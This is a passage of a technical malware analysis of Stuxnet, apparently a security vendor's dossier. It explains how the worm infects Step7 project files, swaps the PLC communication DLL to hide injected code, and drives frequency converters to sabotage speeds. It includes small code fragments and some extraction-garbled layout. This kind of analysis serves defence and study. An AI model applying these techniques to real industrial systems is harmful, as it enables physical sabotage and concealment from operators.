if:\n\n   - It is not deemed too old (used or accessed in the last 3.5 years).\n\n   - It contains a “wincproj” folder with a valid MCP file.\n\n   - It is not a Step7 example project, checked by excluding paths matching “*\\Step7\\Examples\\*”.\n\nThe infection process then consists of several distinct steps:\n\n1. Stuxnet creates the following files:\n\n    - xutils\\listen\\xr000000.mdx (an encrypted copy of the main Stuxnet DLL)\n\n    - xutils\\links\\s7p00001.dbf (a copy of a Stuxnet data file (90 bytes in length)\n\n    - xutils\\listen\\s7000001.mdx (an encoded, updated version of the Stuxnet configuration data block)\n2. The threat scans subfolders under the “hOmSave7” folder. In each of them, Stuxnet drops a copy of a DLL it\n\ncarries within its resources (resource 202). This DLL is dropped using a specific file name. The file name is not\ndisclosed here in the interests of responsible disclosure and will be referred to as xyz.dll.\n3. Stuxnet modifies a Step7 data file located in Apilog\\types.\n\nWhen an infected project is opened with the Simatic manager the modified data file will trigger a search for the\npreviously mentioned xyz.dll file. The following folders are searched in the following order:\n\n   - The S7BIN folder of the Step7 installation folder\n\n   - The %System% folder\n\n   - The %Windir%\\system folder\n\n   - The %Windir% folder\n\n   - Subfolders of the project’s hOmSave7 folder\n\n\n-----\n\nIf the xyz.dll file is not found in one of the first four locations listed above, the malicious DLL will be loaded and\nexecuted by the manager. This .dll file acts as a decryptor and loader for the copy of the main DLL located in\nxutils\\listen\\xr000000.mdx. This strategy is very similar to the DLL Preloading Attacks that emerged in August.\n\nVersions 5.3 and 5.4 SP4 of the manager are impacted. We are unsure whether the latest versions of the man­\nager (v5.4 SP5, v5.5, released in August this year) are affected.\n\n##### MCP files\n\nLike .s7p files, .mcp files may be found inside a Step7 project folder. However, they are normally created by\nWinCC. Finding such a file inside the project may trigger project infection as well as the WinCC database infec­\ntion.\n\nThe project is a candidate for infection if:\n\n- It is not deemed too old (used or accessed in the last 3.5 years).\n\n- It contains a GracS folder with at least one .pdl file in it.\n\nThe infection process then consists of several distinct steps:\n\n1. Stuxnet creates the following files:\n\n  - GracS\\cc_alg.sav (an encrypted copy of the main Stuxnet DLL)\n\n  - GracS\\db_log.sav (a copy of a Stuxnet data file, which is 90 bytes in length)\n\n  - GracS\\cc_alg.sav xutils\\listen\\s7000001.mdx (an encoded, updated version of the Stuxnet configura\n\ntion data block)\n2. A copy of resource 203 is then decrypted and dropped to GracS\\cc_tlg7.sav. This file is a Microsoft Cabinet file\n\ncontaining a DLL used to load and execute Stuxnet.\n\nDuring this infection process, the WinCC database may be accessed and infections spread to the WinCC data­\nbase server machine. This routine is described in the Network Spreading section.\n\n##### TMP files\n\nFor every .tmp file found inside the project, the filename is first validated. It must be in the form ~WRxxxxx.tmp,\nwhere ‘xxxxx’ of hexadecimal digits whose sum module 16 is null. For instance, ~WR12346.tmp would qualify\nbecause 1+2+3+4+6 = 16 = 0 mod 16.\n\nThe file content is then examined. The first eight bytes must contain the following “magic string”: ‘LRW~LRW~’.\nIf so, the rest of the data is decrypted. It should be a Windows module, which is then mapped. Export #7 of this\nmodule is executed.\n\nStuxnet can also harness infected projects to update itself. If a project is opened and it is already infected, Stux­\nnet verifies if the version inside is newer than the current infection and executes it. This allows Stuxnet to update\nitself to newer versions when possible.\n\nThree possible forms of infected project files exist. A different export handles each form.\n\nExport 9 takes a Step7 project path as input, supposedly infected. It will then build paths to the following Stux­\nnet files located inside the project:\n\n- …\\XUTILS\\listen\\XR000000.MDX\n\n- …\\XUTILS\\links\\S7P00001.DBF\n\n- …\\XUTILS\\listen\\S7000001.MDX\n\nThese files are copied to temporary files (%Temp%\\~dfXXXX.tmp) and Export 16, the main entry point within\nthis potentially newer version of Stuxnet, is executed.\n\n\n-----\n\nExport 31 takes a Step7 project path as input and supposedly infected. It will then build paths to the following\nStuxnet files located inside the project:\n\n- …\\GracS\\cc_alg.sav\n\n- …\\GracS\\db_log.sav\n\n- …\\GracS\\cc_tag.sav\n\nThese files are copied to temporary files (%Temp%\\~dfXXXX.tmp). Export #16 within these files is then called to\nrun this version of Stuxnet.\n\nExport 10 is similar to 9 and 31. It can process Step7 folders and extract Stuxnet files located in the Gracs\\ or\nXutils\\ subfolders. It may also process Zip archives.\n\nExport #16 within the extracted files is then used to run the extracted copy of Stuxnet, and eventually update\nthe configuration data block.\n\n\n-----\n\n### Modifying PLCs\n\nResource 208 is dropped by export #17 and is a malicious replacement for Simatic’s s7otbxdx.dll file.\n\nFirst, it’s worth remembering that the end goal of Stuxnet is to infect specific types of Simatic programmable\nlogic controller (PLC) devices. PLC devices are loaded with blocks of code and data written using a variety of\nlanguages, such as STL or SCL. The compiled code is an assembly called MC7. These blocks are then run by\nthe PLC, in order to execute, control, and monitor an industrial process.\n\nThe original s7otbxdx.dll is responsible for handling PLC block exchange between the programming device\n(i.e., a computer running a Simatic manager on Windows) and the PLC. By replacing this .dll file with its own,\nStuxnet is able to perform the following actions:\n\n     - Monitor PLC blocks being written to and read from the PLC.\n\n     - Infect a PLC by inserting its own blocks and replacing or infecting existing blocks.\n\n     - Mask the fact that a PLC is infected.\n\nFigure 19\n###### PLC and Step7\n\n\n#### Simatic PLC 101\n\nTo access a PLC, specific\nsoftware needs to be in­\nstalled. Stuxnet specifically\ntargets the WinCC/Step 7\nsoftware.\n\nWith this software installed,\nthe programmer can con­\nnect to the PLC with a data\ncable and access the mem­\nory contents, reconfigure it,\ndownload a program onto it,\nor debug previously loaded\ncode. Once the PLC has been\nconfigured and programmed,\nthe Windows computer can\nbe disconnected and the PLC\nwill function by itself. To give\nyou an idea of what this looks\nlike, figure 20 is a photo of\nsome basic test equipment.\n\n\nFigure 20\n###### Test equipment\n\n\n-----\n\nFigure 21 shows a portion of Stuxnet’s malicious code in the Step7 STL editor. The beginning of the MC7 code for\none of Stuxnet’s Function Code (FC) blocks is visible. The code shown is from the disassembled block FC1873.\n\nFigure 21\n###### Stuxnet code in the Step7 STL editor\n\n\nFigure 22\n###### Step7 and PCL communicating via s7otbxdx.dll\n\n\nAs mentioned previously, the Step 7 soft­\nware uses a library file called s7otbxdx.dll\nto perform the actual communication with\nthe PLC. The Step7 program calls differ­\nent routines in this .dll file when it wants\nto access the PLC. For example, if a block\nof code is to be read from the PLC using\nStep7, the routine s7blk_read is called.\nThe code in s7otbxdx.dll accesses the PLC,\nreads the code, and passes it back to the\nStep7 program, as shown in figure 22.\n\nLooking at how access to the PLC works\nwhen Stuxnet is installed, once Stux­\nnet executes, it renames the original\ns7otbxdx.dll file to s7otbxsx.dll. It then\nreplaces the original .dll file with its own\nversion. Stuxnet can now intercept any\ncall that is made to access the PLC from\nany software package.\n\n\n-----\n\nStuxnet’s s7otbxdx.dll file contains all\npotential exports of the original .dll file\n– a maximum of 109 – which allows it to\nhandle all the same requests. The major­\nity of these exports are simply forwarded\nto the real .dll file, now called s7otbxsx.\ndll, and nothing untoward happens. In\nfact, 93 of the original 109 exports are\ndealt with in this manner. The trick, how­\never, lies in the 16 exports that are not\nsimply forwarded but are instead inter­\ncepted by the custom .dll file. The inter­\ncepted exports are the routines to read,\nwrite, and enumerate code blocks on the\nPLC, among others. By intercepting these\nrequests, Stuxnet is able to modify the\ndata sent to or returned from the PLC\nwithout the operator of the PLC realizing\nit. It is also through these routines that\nStuxnet is able to hide the malicious code\nthat is on the PLC.\n\nThe following are the most common\ntypes of blocks used by a PLC:\n\n- Data Blocks (DB) contain program-spe­\n\n\nFigure 23\n###### Communication with malicious version of s7otbxdx.dll\n\n\ncific data, such as numbers, structures,\nand so on.\n\n   - System Data Blocks (SDB) contain information about how the PLC is configured. They are created depending\n\non the number and type of hardware modules that are connected to the PLC.\n\n   - Organization Blocks (OB) are the entry point of programs. They are executed cyclically by the CPU. In regards\n\nto Stuxnet, two notable OBs are:\n\n    - OB1 is the main entry-point of the PLC program. It is executed cyclically, without specific time requirements.\n\n    - OB35 is a standard watchdog Organization Block, executed by the system every 100 ms. This function may\n\ncontain any logic that needs to monitor critical input in order to respond immediately or perform functions\nin a time critical manner.\n\n   - Function Blocks (FC) are standard code blocks. They contain the code to be executed by the PLC. Generally, the\n\nOB1 block references at least one FC block.\n\n#### The infection process\n\nStuxnet infects PLC with different code depending on the characteristics of the target system. An infection se­\nquence consists of code blocks and data blocks that will be injected into the PLC to alter its behavior. The threat\ncontains three main infection sequences. Two of these sequences are very similar, and functionally equivalent.\nThese two sequences are dubbed A and B. The third sequence is dubbed sequence C.\n\nInitially, if the DLL is running inside the ccrtsloader.exe file, the malicious s7otbxdx.dll starts two threads respon­\nsible for infecting a specific type of PLC:\n\n   - The first thread runs an infection routine every 15 minutes. The targeted PLC information has previously been\n\ncollected by the hooked exports, mainly s7db_open(). This infection routine specifically targets CPUs 6ES7315-2 (series 300) with special SDB characteristics. The sequence of infection is A or B.\n\n   - The second thread regularly queries PLC for a specific block that was injected by the first thread if the infec­\n\ntion process succeeded. This block is customized, and it impacts the way sequences A or B run on the infected\nPLC.\n\nFinally, the injection of sequence C appears disabled or was only partially completed. Sequence C can be written\n\n\n-----\n\n#### The infection thread, sequences A and B\n\nThis thread runs the infection routine every 15 minutes. When a PLC is “found”, the following steps are executed:\n\n   - First, the PLC type is checked using the s7ag_read_szl API. It must be a PLC of type 6ES7-315-2.\n\n   - The SDB blocks are checked to determine whether the PLC should be infected and if so, with which sequence\n\n(A or B).\n\n   - If the two steps above passed, the real infection process starts. The DP_RECV block is copied to FC1869, and\n\nthen replaced by a malicious block embedded in Stuxnet.\n\n   - The malicious blocks of the selected infection sequence are written to the PLC.\n\n   - OB1 is infected so that the malicious code sequence is executed at the start of a cycle.\n\n   - OB35 is also infected. It acts as a watchdog, and on certain conditions, it can stop the execution of OB1.\n\nThe three key steps of the infection process are detailed below.\n\n##### SDB check\n\nThe System Data Blocks are enumerated and parsed. Stuxnet must find an SDB with the DWORD at offset 50h\nequal to 0100CB2Ch. This specifies the system uses the Profibus communications processor module CP 342-5.\nProfibus is a standard industrial network bus used for distributed I/O, In addition, specific values are searched\nfor and counted: 7050h and 9500h. The SDB check passes if, and only if, the total number of values found is\nequal to or greater than 33. These appear to be Profibus identification numbers, which are required for all Profi­\nbus DP devices except Master Class 2 devices. Identification numbers are assigned to manufacturers by Profibus\n& Profinet International (PI) for each device type they manufacture. 7050h is assigned to part number KFC750V3\nwhich appears to be a frequency converter drive (also known as variable frequency drive) manufactured by\nFararo Paya in Teheran, Iran. 9500h is assigned to Vacon NX frequency converter drives manufactured by Vacon\nbased in Finland.\n\nFrequency converter drives are used to control the speed of another device, such as a motor. For example, if the\nfrequency is increased, the speed of the motor increases. Frequency converter drives are used in multiple indus­\ntrial control industries including water systems, HVAC, gas pipelines, and other facilities.\n\nThus, the targeted system is using Profibus to communicate with at least 33 frequency converter drives from one\nor both of the two manufacturers, where sequence A is chosen if more Vacon devices are present and sequence\nB is chosen if more Fararo Paya devices are present.\n\n##### DP_RECV replacement\n\nDP_RECV is the name of a standard function block used by network coprocessors. It is used to receive network\nframes on the Profibus – a standard industrial network bus used for distributed I/O. The original block is copied\nto FC1869, and then replaced by a malicious block. Figure 24\nEach time the function is used to receive a packet, OB1 before and after infection\nthe malicious Stuxnet block takes control: it will call\nthe original DP_RECV in FC1869 and then do postprocessing on the packet data.\n\n##### OB1/OB35 infection\n\nStuxnet uses a simple code-prepending infection\ntechnique to infect Organization Blocks. For example,\nthe following sequence of actions is performed when\nOB1 is infected:\n\n   - Increase the size of the original block.\n\n   - Write malicious code to the beginning of the block.\n\n   - Insert the original OB1 code after the malicious\n\ncode.\n\nFigure 24 illustrates OB1 before and after infection.\n\n\n-----\n\n##### Sequence blocks\n\nSequences A and B are extremely close and functionally equivalent. They consist of 17 blocks, the malicious\nDP_RECV replacement block, as well as the infected OB1 and OB35 blocks. Figure 25 shows the connections\nbetween the blocks.\n\nFigure 25\n###### Connections Between Blocks, Sequences A and B\n\n**Legend:**\n\n- Arrows between two code blocks mean that a block calls or executes another block.\n\n- The pink block represents the main block, called from the infected OB1.\n\n- White blocks are standard Stuxnet code blocks.\n\n- Yellow blocks are also Stuxnet blocks, but copied from the Simatic library of standard blocks. They execute common functions, such as timestamp com­\n\nparison.\n\n- Gray blocks are not part of Stuxnet; they’re system function blocks, part of the operating system running on the PLC. They’re used to execute system\n\ntasks, such as reading the system clock (SFC1).\n\n- Green blocks represent Stuxnet data blocks.\n\nNote that block names are misleading (except for the yellow and gray blocks), in the sense that they do not re­\nflect the real purpose of the block.\n\nSequences A and B intercept packets on the Profibus by using the DP_RECV hooking block. Based on the values\nfound in these blocks, other packets are generated and sent on the wire. This is controlled by a complex state\nmachine, implemented in the various code blocks that make the sequence. One can recognize an infected PLC in\na clean environment by examining blocks OB1 and OB35. The infected OB1 starts with the following instructions,\nmeant to start the infection sequence and potentially short-circuit OB1 execution on specific conditions:\n```\nUC  FC1865\n\nPOP\n\nL   DW#16#DEADF007\n\n==D\n\nBEC\n\nL   DW#16#0\n\nL   DW#16#0\n\n```\n\n-----\n\nThe infected OB35 starts with the following instructions, meant to short-circuit OB35 on specific conditions:\n```\nUC  FC1874\n\nPOP\n\nL   DW#16#DEADF007\n\n==D\n\nBEC\n\nL   DW#16#0\n\nL   DW#16#0\n\n##### The monitor thread\n\n```\nThis secondary thread is used to monitor a data block DB890 of sequence A or B. Though constantly running\nand probing this block (every 5 minutes), this thread has no purpose if the PLC is not infected. The purpose of\nthe thread is to monitor each S7-315 on the bus. When the sabotage routine is begun, the thread writes to the\nDB890 block of all the other S7-315s on the bus in order to have them begin the sabotage routine as well. This\nthread causes the attack to begin almost simultaneously for all S7-315 devices on the same bus.\n\n##### Behavior of a PLC infected by sequence A/B\n\nInfection sequences A and B are very similar. Unless otherwise stated, what’s mentioned here applies to both\nsequences.\n\n  - The infection code for a 315-2 is organized as follows:\n\n   - The replaced DP_RECV block (later on referred to as the “DP_RECV monitor”) is meant to monitor data sent\n\nby the frequency converter drives to the 315-2 CPU via CP 342-5 Profibus communication modules.\n\n   - Up to 6 CP 342-5 Profibus communication modules are supported. Each is a master on its own Profibus\n\nsubnet with 31 frequency converter drives as slaves. The addresses of the CP 342-5 modules are recorded.\nNote the 315-2 CPU documentation recommends no more than 4 CP 324-5 modules, but in theory can\nsupport more, depending on CPU performance.\n\n  - Frames sent over Profibus are inspected. They are expected to have a specific format. Each frame should\n\nhave 31 records—one for each slave—of either 28 or 32 bytes as the format differs slightly for the two dif­\nferent frequency converter drives. Some fields are stored.\n\n  - The other blocks implement a state machine that controls the process. Transitions from state i to state i+1\n\nare based on events, timers or task completions.\n\n   - In state 1 fields recorded by the DP_RECV monitor are examined to determine if the target system is in a\n\nparticular state of operation. When enough fields match simple criteria, a transition to state 2 occurs.\n\n  - In state 2 a timer is started. Transitioning to state 3 occurs after two hours have elapsed.\n\n  - In states 3 and 4, network frames are generated and sent on the Profibus to DP slaves. The contents of these\n\nframes are semi-fixed, and partially depend on what has been recorded by the DP_RECV monitor.\n\n  - State 5 initiates a reset of various variables used by the infection sequence (not to be confused with a PLC\n\nreset), before transitioning to state 1. Transitioning to state 0 may also occur in case of errors.\n\n  - In state 0, a 5-hour timer is started.\n\nFigure 29 represents a simplified view of this state machine.\n\nThe normal path of execution is 1-2-3-4-5-1 – as shown by the solid, blue arrows in the diagram. Let’s detail what\nhappens during each state.\n\nThe initial state is 1 (circled in red). Transitioning to state 2 can take a fair amount of time. The code specifically\nmonitors for records within the frames sent from the frequency converter drives that contain the current operat­\ning frequency (speed of the device being controlled). This value is held at offset 0xC in each record in the frame\nand is referred to as PD1 (parameter data 1). The frequency values can be represented in hertz (Hz) or decihertz\n(deciHz). The attackers expect the frequency drives to be running between 807 Hz and 1210 Hz. If PD1 has a\nvalue greater than 1210, the code assumes the values being sent are represented in deciHertz and adjusts all\nfrequency values by a factor of 10. For example 10000 would be considered 10,000 deciHertz (1000.0 Hz) rather\nthan 10,000Hz. The routine that counts these records (here after referred to as events) is called once per minute.\n\n\n-----\n\nEvents are counted with a cap of 60 per minute. It seems that this is the optimal, expected rate of events. The\nglobal event counter, initially set to 1,187,136, must reach 2,299,104 to initiate a transition to state 2. If we as­\nsume an optimal number of events set to 60 (the max could be 186, but remember the cap), the counting being\ntriggered every minute, the transition occurs after (2299104-1187136)/60 minutes, which is 12.8 days.\n\nTransitioning from state 2 to 3 is a matter of waiting 2 hours.\n\nFigure 26\n###### State machine path of execution\n\nIn states 3 and 4 two network send bursts occur. The traffic generated is semi-fixed, and can be one of the two\nsequences. The sequences consist of multiple frames that each contain 31 records. Each frame is sent to each\nCP 342-5 module, which passes on the respective record within the frame to each of the 31 frequency converter\ndrive slaves.\n\nFor infection sequence A (for Vacon frequency converters):\n\n- Sequence 1 consists of 147 frames:\n\n  - 145 frames for sub-sequence 1a, sent during state 3.\n\n  - 2 frames for sub-sequence 1b, sent during state 4.\n\n- Sequence 2 consisting of 163 frames:\n\n  - 127 frames for sub-sequence 2a, sent during state 3.\n\n  - 36 frames for sub-sequence 2b, sent during state 4.\n\nFor infection sequence B (for Fararo Paya frequency converters):\n\n- Sequence 1 consists of 57 frames:\n\n  - 34 frames for sub-sequence 1a, sent during state 3.\n\n  - 23 frames for sub-sequence 1b, sent during state 4.\n\n- Sequence 2 consists of 59 frames:\n\n\n-----\n\n  - 32 frames for sub-sequence 2a, sent during state 3.\n\n  - 27 frames for sub-sequence 2b, sent during state 4.\n\nTransitioning from state 3 to state 4 takes 15 minutes for sequence 1 and 50 minutes for sequence 2.\n\nThe data in the frames are instructions for the frequency converter drives. For example one of the frames con­\ntains records that change the maximum frequency (the speed at which the motor will operate). The frequency\nconverter drives consist of parameters, which can be remotely configured via Profibus. One can write new values\nto these parameters changing the behavior of the device. The values written to the devices can be found in Ap­\npendix C.\n\nOf note, for sequence A, the maximum frequency is set to 1410 Hz in sequence 1a, then set to 2 Hz in sequence\n2a, and then set to 1064 Hz in sequence 2b. Thus, the speed of the motor is changed from 1410Hz to 2Hz to\n1064Hz and then over again. Recall the normal operating frequency at this time is supposed to be between 807\nHz and 1210 Hz.\n\nThus, Stuxnet sabotages the system by slowing down or speeding up the motor to different rates at different\ntimes.\n\nWhen a network send (done through the DP_SEND primitive) error occurs, up to two more attempts to resend the\nframe will be made. Cases where a slave coprocessor is not started are also gracefully handled through the use\nof timers.\n\nDuring states 3 and 4, the execution of the original code in OB1 and OB35 is temporarily halted by Stuxnet. This\nis likely used to prevent interference from the normal mode of operation while Stuxnet sends its own frames.\n\nDuring processing of state 5, various fields are initialized before transitioning to state 1 and starting a new cycle.\nThe two major events are:\n\n- The global event counter is reset (which was initially 1187136). This means that future transitions from state 1\n\nto state 2 should take about 26.6 days.\n\n- The DP_RECV monitor is reset. This means that the slave reconnaissance process is to take place again before\n\nframe snooping occurs. (Incidentally, note that slave reconnaissance is forced every 5.5 hours.)\n\nTransition to state 0 then occurs if an error was reported. “Error” in this context usually means that OB1 took too\nlong to execute (over 13 seconds). Otherwise, a regular transition to state 1 takes place.\n\nIt is worth mentioning that short-circuits, used to transition directly through states 0 and 1 to state 3, are de­\nsigned to allow the sabotage routine to begin immediately. This occurs when another S7-315 on the same bus\nhas fulfilled the wait period. The Windows monitoring thread will modify DB890, setting a flag, causing the PLC\ncode to immediately begin the sabotage routine and to no longer wait the requisite time. This behavior synchro­\nnizes the sabotage routine across all 315s controlled by the same Windows system.\n\nLet’s detail the purpose of the DP_RECV monitor and the subsequent frames sent during state 3 and 4. The code\nexpects a structure of 31 records of either 28 or 32 bytes (depending on which frequency drive is installed).\nHere’s the header of such a record:\n\n**Offset Type** **Name**\n0 word ID\n2 word Index (IND)\n4 dword VALUE\n8 word ControlWord (CW)/StatusWord (SW)\n10 word Reference (REF)/Actual (ACT)\n12 word Process Data 1 (PD1)\n…\n\nThe monitor is especially interested in fields SW, ACT, and PD1. The following pieces of information are recorded:\n\n- Is the tenth bit in SW set? This specifies FieldBus Control is on (one can control the devices via Profibus).\n\n\n-----\n\n- The value of PD1, which is the output frequency (the current frequency/speed).\n\nThe other fields are ignored.\n\nWhen reaching states 3 and 4, the original PLC code is halted and the malicious PLC code begins sending frames\nof data based on the recorded values during the DP_RECV monitor phase. The purpose of sending the frames is\nto change the behavior of the frequency converter drives. First of all DP_SEND will send similar types of frames\nas the ones that are expected to be received by DP_RECV (which means each frame will contain 31 records of 28\nor 32 bytes—one record for each slave frequency converter drive). Each record sent changes a configuration,\nsuch as the maximum frequency on the frequency converter drive. The record fields will be set to zero, except for\nthe ID, Value, CW, and REF fields.\n\nTable 6\n##### ID Field Format\n###### ID Byte 1 ID Byte 2\n\n15 14 13 12 11 10 9 8 7 6 5 4 3 2 1 0\n\n###### Request Type SM Parameter Number\n\n- ID specifies the parameter to change. The format of the ID field is detailed in Table 6.\n\n- VALUE contains the new value for the particular parameter. For frequency values, a factor of ten can be ap­\n\nplied if the system was determined to be using deciHz units.\n\n- CW (ControlWord) in sequence A is typically set to 47Fh, which means ‘Run’, but can start by sending 477h\n\n(Stop by Coast) and finishes by using 4FFh (Fault Reset). CW in sequence B is set to 403h.\n\n- REF can range from 100% to -100% represented by 10000 or -10000. This specifies the drive should be\n\noperating at the maximum (100%) frequency either in a forward (positive 10000) or reverse (negative 10000)\ndirection. The previous direction, before the behavior of the frequency converter drives were hijacked, is main­\ntained, but at 100% potentially with a new maximum frequency.\n\n|Table 6|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|Col14|Col15|Col16|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|ID Field Format||||||||||||||||\n|ID Byte 1||||||||ID Byte 2||||||||\n|15|14|13|12|11|10|9|8|7|6|5|4|3|2|1|0|\n|Request Type||||SM|Parameter Number|||||||||||\n\n\nThe parameters that are\nmodified and their values are\nin Appendix C. To more clearly\nillustrate the behavior of the\ninjected code, we’ve outlined\nthe key events that would\noccur with an infected 315-2\nCPU connected to multiple\nCP 342-5 modules each with\n31 frequency converter drive\nslaves, as shown in the dia­\ngram below.\n\n- The PLC is infected.\n\n- Frequency converter slaves\n\n\nFigure 27\n###### Connections between sequence blocks\n\n\nsend records to their CP342-5 master, building a\nframe of 31 records The\nCPU records the CP-342-5\naddresses.\n\n- The frames are examined and the fields are recorded.\n\n- After approximately 13 days, enough events have been recorded, showing the system has been operating\n\nbetween 807 Hz and 1210 Hz.\n\n- The infected PLC generates and sends sequence 1 to its frequency converter drives, setting the frequency to\n\n1410Hz.\n\n- Normal operation resumes.\n\n- After approximately 27 days, enough events have been recorded.\n\n\n-----\n\ninitially to 2Hz and then 1064Hz.\n\n- Normal operation resumes.\n\n- After approximately 27 days, enough events have been recorded.\n\n- The infected PLC generates and sends sequence 1 to its frequency converter drives, setting the frequency to\n\n1410Hz.\n\n- Normal operation resumes.\n\n- After approximately 27 days, enough events have been recorded.\n\n- The infected PLC generates and sends sequence 2 to its frequency converter drives, setting the frequency\n\ninitially to 2Hz and then 1064Hz.\n\n- …\n\n##### Sequence C\n\nStuxnet has a second sabotage strategy targeting S7-417 PLCs. However, the routine is incomplete and the PLC\ncode, referred to as sequence C, is never purposefully copied onto a PLC or executed. While we can speculate the\nPLC code injection was active at a previous time, sequence C itself appears unfinished, contains unimplemented\ncases, unused code blocks, and test or debug code. This sequence is more complex than sequences A or B. It\ncontains more blocks of code and data (32), and also generates data blocks on-the-fly using specific SFC blocks.\nThe figure below represents sequence C.\n\nFigure 28\n###### Connections Between Blocks, Sequence C\n\n Sequence C Injection\n\nStuxnet hooks the Step 7 write function, so that whenever someone updates code on the PLC, sequence C is cop­\nied to the PLC. However, because code for a single function in the DLL is missing, sequence C is never properly\nactivated.\n\n\n-----\n\nThe S7-417 PLC code-installation routine starts when an operator of the target system performs a write opera­\ntion to a S7-417 PLC, such as updating code. The SDB7 is read and DB8061 (consisting of Stuxnet-specific data)\nis created based on the values in SDB7. However, due to the incomplete function in the DLL, DB8061 is never cre­\nated and the data contained in DB8061 is unknown. In particular, the reference to the function exists, but when\ncalled, a Windows exception occurs. The exception is caught and execution resumes as if DB8061 was created.\n\nFigure 29\n###### Code where an exception is thrown\n```\n.text:1000D947 68 70 C8 03 10 push  offset unk _ 1003C870\n\n.text:1000D94C 8D 45 FF  lea   eax, [ebp+var _ 1]\n\n.text:1000D94F 50  push  eax\n\n.text:1000D950 E8 93 47 00 00 call  _ _ CxxThrowException@8\n\n.text:1000D950\n\n```\nThe blocks that compose sequence C are then written to the PLC, including the modifications of SDB0 and SDB4,\nand OB80 is created as well, if it did not previously exist. OB80 is the time-event error interrupt and is called if\nthe maximum cycle time is exceeded. SDB0 is expected to contain records holding CPU configuration informa­\ntion. The block is parsed and a static 10-byte long record is inserted into the block. The purpose of this insertion\nis unknown. However, contrary to what happens with sequences A and B, no specific values are searched in the\nblock. Moreover, record 13 of SDB0 can be modified.\n\nThe creation timestamp of SDB0 is incremented, and this timestamp is replicated to a specific location in SDB4\nfor consistency. Sequence C is written and Stuxnet also makes sure an OB80 exists, or else creates an empty\none.\n\nLater, the modification of OB1 (the entry point) that is needed to execute sequence C never occurs. The code to\nmodify OB1 requires the successful completion of the missing function and since the function throws an excep­\ntion, OB1 is not modified and the remaining sequence C code blocks are never executed.\n\nEven if OB1 is modified to execute sequence C, the missing (or an existing unrelated) DB8061 would cause\nsequence C to operate improperly. Finally, even if OB1 was modified and DB8061 contained correct values,\nunimplemented cases in sequence C would likely cause it to operate unexpectedly. Thus, sequence C appears\nunfinished.\n\nStuxnet also hooks Step 7 to monitor for writes specifically to SDB7. When SDB7 is written, Stuxnet will modify\nthree bytes in DB8061. Thus, if DB8061 already exists coincidentally on the target PLC, three values will acci­\ndentally be modified, potentially corrupting the PLC operation.\n\nThe following provides a step-by-step summary of the failed injection process:\n\n\n1. Read SDB7\n\n2. Attempt to generate DB8061, which fails\n\n3. Modify SDB0, SDB4\n\n4. Copy sequence C blocks to the PLC (do not overwrite existing\n\nblocks)\n5. Create OB80 if it does not exist\n\n6. Modify OB1 (does not occur)\n\n###### Sequence C Behavior\n\nThe following describes the behavior of sequence C. However,\nthese behaviors never happen due to the missing function in the\nDLL. Sequence C consists of 40 blocks, 26 containing Stuxnet\ncode, 4 with standard code blocks, and 10 containing data.\n\nSequence C consists of a state machine with eight states.\nDB8061 is critical to the operation of sequence C and because\nDB8061 is missing, the exact behavior of sequence C is unknown.\n\n\nFigure 30\n###### Eight states in sequence C\n\n\n-----\n\n###### State 0: Wait\n\nThe code expects six groups of 164 peripherals. Based on knowledge from the S7-315 code, these could be six\ncascades containing 164 centrifuges each. Stuxnet monitors the groups, and the sum of the activity times for all\ngroups must be greater than 297 days or for a single group greater than 35 days. In addition, all groups must be\nactive for at least three days.\n\n###### State 1: Recording\n\nDB8064 through DB8070 (seven blocks) are created and each contains three sub-blocks for a total of 21 subblocks. The input area of an I/O image is copied into each sub-block with a one second interval between copies,\nforming a 21 second recording of the input area. The input area contains information being passed to the PLC\nfrom a peripheral. (For example, the current state of a valve or the temperature of a device.)\n\n###### State 2 - 6: Sabotage\n\nWhen the peripheral output is written to, sequence C intercepts the output and ensures it is not written to the\nprocess image output. The output is the instructions the PLC sends to a device to change its operating behavior.\nBy intercepting the peripheral output, Stuxnet prevents an operator from noticing unauthorized commands sent\nto the peripheral.\n\nEach cascade of 164 peripherals is grouped into 15 clusters (0 – 14). Each cluster is affected, but not every cen­\ntrifuge within a cluster is affected. The following table shows for each group how many peripherals within each\ncluster are affected.\n\nTable 7\n##### Affected peripherals within each cluster\n###### Cluster\n\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14\n\n###### Number\n Peripherals in\n\n2 2 4 6 8 10 12 16 20 24 20 16 12 8 4\n\n###### the Cluster\n Peripheral 80- 104- 124- 140- 152- 160\n0-1 2-3 4-7 8-13 14-21 22-31 32-43 44-59 60-79\n\n###### Number 103 123 139 151 159 163\n Peripherals\n\n2 2 2 4 6 8 10 13 14 0 14 13 10 8 4\n\n###### affected\n\nThe particular peripherals within the clusters that are affected are pseudo-randomly chosen. For example, clus­\nter 4 contains 8 peripherals (peripheral 14 to 21). According to the table, 6 out of 8 are affected. One peripheral\nwithin the cluster is pseudo-randomly selected. Let’s say peripheral 20 is selected. Stuxnet will then sabotage\nperipherals 20, 21, 14, 15, 16, and 17. If an error occurs when attempting to sabotage one of the peripherals, the\nnext one is selected. For example, if an error occurs when affecting peripheral 15, then peripherals 16, 17, and\nnow 18 would be targeted.\n\nA total of 110 peripherals will be affected out of 164.\n\nWhile this behavior occurs across the four states, state 3 takes place in two parts, with a two minute break in\nbetween. The transition from state 5 to state 6 takes place after 2 minutes, 53 seconds.\n\nState 6 is the state where the writing to the image/peripheral output takes place. This state lasts 6 minutes, 58\nseconds.\n\nHow the peripherals are affected is unknown. Data is written to the image/peripheral output changing their\nbehavior, but the data to be written is within DB8061, which is missing.\n\n###### State 7: Reset\n\nThe seven dynamically created data blocks (DB8064-DB8070) are deleted and many of the data values in the\ndata blocks are reset. State 7 can also be reached if any error occurs or if more than seven seconds elapses\n\n|Table 7|Col2|Col3|Col4|Col5|Col6|Col7|Col8|Col9|Col10|Col11|Col12|Col13|Col14|Col15|Col16|\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n|Affected peripherals within each cluster||||||||||||||||\n|Cluster Number|0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|\n|Peripherals in the Cluster|2|2|4|6|8|10|12|16|20|24|20|16|12|8|4|\n|Peripheral Number|0-1|2-3|4-7|8-13|14-21|22-31|32-43|44-59|60-79|80- 103|104- 123|124- 139|140- 151|152- 159|160- 163|\n|Peripherals affected|2|2|2|4|6|8|10|13|14|0|14|13|10|8|4|\n\n\n-----\n\nA return to state 1 will occur, resulting in a cycle consisting of waiting approximately 35 days, followed by a seven\nminute attack phase.\n\nThus, while the clear intention of the S7-417 code is unknown, key 